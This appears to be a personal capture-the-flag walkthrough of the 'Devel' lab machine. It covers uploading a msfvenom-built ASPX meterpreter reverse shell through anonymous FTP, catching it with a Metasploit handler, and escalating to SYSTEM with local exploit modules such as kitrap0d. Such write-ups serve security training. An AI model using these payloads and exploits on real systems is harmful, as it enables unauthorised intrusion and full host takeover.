# DEVEL 

here only ftp and http 

we can connect as anonymous on the ftp and we can see the ftp is hosting the web server files
so lets create a reverse shell and upload it to the ftp server

.php not working 
create a reverseshell .asp or .aspx 
```
msfvenom  -p windows/meterpreter/reverse_tcp  -f aspx -o shell.aspx 
msfvenom  -p windows/meterpreter/reverse_tcp  -f asp -o shell.asp
```

make a listenner on metasploit and access files on the web

```
use exploit/multi/handler
set lhost 10.10.14.28
set payload windows/meterpreter/reverse_tcp
```

there we go
```
meterpreter > getuid
Server username: IIS APPPOOL\Web
```

lets try windows windows exploit suggester
ctrl + z 
```
use post/multi/recon/local_exploit_suggester
```

set the session right and run
i tried the 3 firsts 
- exploit/windows/local/bypassuac_eventvwr
- exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move
- exploit/windows/local/ms10_015_kitrap0d

third time's a charm

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM


